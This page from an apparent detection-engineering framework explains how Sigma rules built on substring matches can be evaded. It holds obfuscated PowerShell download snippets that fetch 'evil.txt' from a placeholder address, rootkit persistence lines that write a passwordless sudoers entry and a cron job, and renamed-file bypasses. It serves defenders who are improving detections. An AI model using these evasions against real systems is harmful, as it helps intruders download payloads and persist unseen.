## ADE1 - Reformatting in Actions


Reformatting in Actions occurs when a detection rule relies on **string match conditions**, and an attacker can manipulate the collected logs such that the match fails.  
This has been widely exploited by Threat Actors for years and still appears in modern SIEM rules.

**Sub-categories:**

- **ADE1-01: Substring Manipulation**  
  When detection logic relies on substring matches, an attacker can alter or obfuscate the input data so that the hypothesis conditions are not met, resulting in a False Negative.


---

### ADE1-01 Substring Manipulation

This exists when an attacker can manipulate the input data being collected, and the logic conditions relies on a substring match(es), then there exists an opportunity to bypass the conditions of the hypothesis via string manipulation.

### Examples

---
#### Example 1: Sigma rule [Suspicious PowerShell Download](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_classic/posh_pc_susp_download.yml)

The first example was given in [Detection Logic Bug Theory](theory_1_detection_logic_bug_theory.md).

Relevant detection logic component from the Sigma rule.
```yaml
detection:
    selection_webclient:
        Data|contains: 'Net.WebClient'
    selection_download:
        Data|contains:
            - '.DownloadFile('
            - '.DownloadString('
    condition: all of selection_*
```

The detection logic itself searches for the presence of `Web.Client`, `.DownloadString(` and `.DownloadFile(` methods in script block logging. Therefore the Null Hypothesis is: *A file is downloaded by a powershell script when*:
- Condition A: substring `Web.Client` exists, AND 
- Condition B: substring `.DownloadString` exists, OR
- Condition C: substring `.DownloadFile` exists

This can be understood as `Hit when A AND (B OR C) == True`

The *bug* is the reliance on substrings that are mutable by the attacker, or **ADE1-01 Substring Manipulation**.

Below are examples of bypasses (False Negatives) that result from the presence of the bug.

##### Bypass 1: Method name obfuscation followed by variable usage

> ADE01-01 Reformatting in Actions - Substring Manipulation

```PowerShell
$url = "ADDRESS\evil.txt";
$wc = New-Object Net.WebClient;
$methodName = "Down" + "loadString";
$file = $wc.$methodName($url);
Set-Content -Path "DIRECTORY_TO_WRITE_TO\evil.txt" -Value $file
```

##### Bypass 2: Method name obfuscation followed by variable usage (Short)

> ADE01-01 Bug Category: Reformatting in Actions - Substring Manipulation

```PowerShell
$url = "ADDRESS\evil.txt";
$wc = New-Object Net.WebClient;
$wc.("Download" + "File")($url,"DIRECTORY_TO_WRITE_TO\evil.txt")
```


---


#### Example 2: [Triple Cross eBPF Rootkit Default Persistence](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/file_event/file_event_lnx_triple_cross_rootkit_persistence.yml)

The Sigma rule contents are as follows.
```yaml
title: Triple Cross eBPF Rootkit Default Persistence
id: 1a2ea919-d11d-4d1e-8535-06cda13be20f
status: test
description: Detects the creation of "ebpfbackdoor" files in both "cron.d" and "sudoers.d" directories. Which both are related to the TripleCross persistence method
references:
    - https://github.com/h3xduck/TripleCross/blob/12629558b8b0a27a5488a0b98f1ea7042e76f8ab/apps/deployer.sh
author: Nasreddine Bencherchali (Nextron Systems)
date: 2022-07-05
modified: 2022-12-31
tags:
    - attack.privilege-escalation
    - attack.execution
    - attack.persistence
    - attack.defense-evasion
    - attack.t1053.003

logsource:
    product: linux
    category: file_event
detection:
    selection:
        TargetFilename|endswith: 'ebpfbackdoor'
    condition: selection
falsepositives:
    - Unlikely
level: high
```

Below is the related portion [taken from rootkit public PoC](https://github.com/h3xduck/TripleCross/blob/master/src/helpers/deployer.sh)
```shell
## Persistence
declare CRON_PERSIST="* * * * * osboxes /bin/sudo /home/osboxes/TFG/apps/deployer.sh"
declare SUDO_PERSIST="osboxes ALL=(ALL:ALL) NOPASSWD:ALL #"
echo "$CRON_PERSIST" > /etc/cron.d/ebpfbackdoor
echo "$SUDO_PERSIST" > /etc/sudoers.d/ebpfbackdoor
```

Although this rule does pick up the original implementation of TripleCross eBPF rootkit dropped ebpfbackdoor named files, the actor could easily mutate this filename.

The *bug* is the reliance on substrings that are mutable by the attacker, or **ADE1-01 Substring Manipulation**.

In situations like these, modern rule management can be a fix:
- TripleCross eBPF rootkit was dropping 'ebpfbackdoor' files in 2022. 
- See the creation date in the yaml, relevent when first created.
- Detection rules that rely on threat intelligence (hunting rules/emerging threat rules) will have different timeliness characteristics than a main ruleset's [robust detections](https://center-for-threat-informed-defense.github.io/summiting-the-pyramid/definitions/#robust-detection) which are closer to TTPs (top of the pyramid). Therefore this sigma rule should ideally be treated as having different timeliness and expiration expectations.
- The rule is part of the Sigma linux file event ruleset in 2026, so it's Robust variation **would ideally** be looking for file creations in `/etc/cron.d/` or `/etc/sudoers.d/`

The ADE framework will also catch detection rules like this, as the query logic can be mutable by an attacker, or a bug will arise over time as systems/tooling changes or becomes publically accessible and is cloned and permutated into multiple versions.

##### Bypass 1: Method name obfuscation followed by variable usage (Short)

> ADE01-01 Bug Category: Reformatting in Actions - Substring Manipulation

```shell
## Persistence
declare CRON_PERSIST="* * * * * osboxes /bin/sudo /home/osboxes/TFG/apps/deployer.sh"
declare SUDO_PERSIST="osboxes ALL=(ALL:ALL) NOPASSWD:ALL #"
echo "$CRON_PERSIST" > /etc/cron.d/<not_ebpfbackdoor>
echo "$SUDO_PERSIST" > /etc/sudoers.d/<not_ebpfbackdoor>
```

Here any filename that doesn't match ebpfbackdoor would result in a False Negative.


#### Example 3: [Use Get-NetTCPConnection](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_module/posh_pm_susp_get_nettcpconnection.yml)

Another Sigma rule example, using `Get-NetTCPConnection` for network discovery.

```yaml
title: Use Get-NetTCPConnection
id: b366adb4-d63d-422d-8a2c-186463b5ded0
status: test
description: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.
references:
    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1049/T1049.md#atomic-test-2---system-network-connections-discovery-with-powershell
author: frack113
date: 2021-12-10
modified: 2023-10-27
tags:
    - attack.discovery
    - attack.t1049
logsource:
    product: windows
    category: ps_classic_start
detection:
    selection:
        Data|contains: 'Get-NetTCPConnection'
    condition: selection
falsepositives:
    - Unknown
level: low
```

This detection logic relies on PowerShell records that include Get-NETTCPConnection substring.

The *bug* is the reliance on substrings that are mutable by the attacker, or **ADE1-01 Substring Manipulation**.

##### Bypass 1: Method name obfuscation

> ADE01-01 Bug Category: Reformatting in Actions - Substring Manipulation

The logsource category ps_classic_start in Sigma is for PowerShell CommandLine events (event ID 400). Logged fields include CommandLine, CommandPath, ScriptName, etc.

The field value that includes the substring would be `Commandline`. The command below utilizes `Get-NetTCPConnection` to dump connection information as json into `tcp.json` while creating a False Negative.

```powershell
$ps = [System.Management.Automation.PowerShell]::Create();
$ps.AddCommand("Get-Net"+"TCP"+"Connection") | Out-Null;
$ps.AddParameter("State","Established") | Out-Null;
$result = $ps.Invoke();
$result | ConvertTo-Json -Depth 4 | Set-Content DIRECTORY_TO_WRITE_TO\tcp.json -Encoding utf8
```


---

**Contents**


- [README.md](README.md)
- [Detection Logic Bug Theory](Detection_Logic_Bug_Theory.md)
- [Detection Logic Bug Taxonomy](Detection_Logic_Bug_Taxonomy.md)
- **ADE1 Reformatting in Actions (Current Page)**
- [ADE2 Omit Alternatives](ADE2_Omit_Alternatives.md)
- [ADE3 Context Development](ADE3_Context_Development.md)
- [ADE4 Logic Manipulation](ADE4_Logic_Manipulation.md)
- [Bug Likelihood Test](Bug_Likelihood_Test.md)
- [LICENCE](LICENSE)
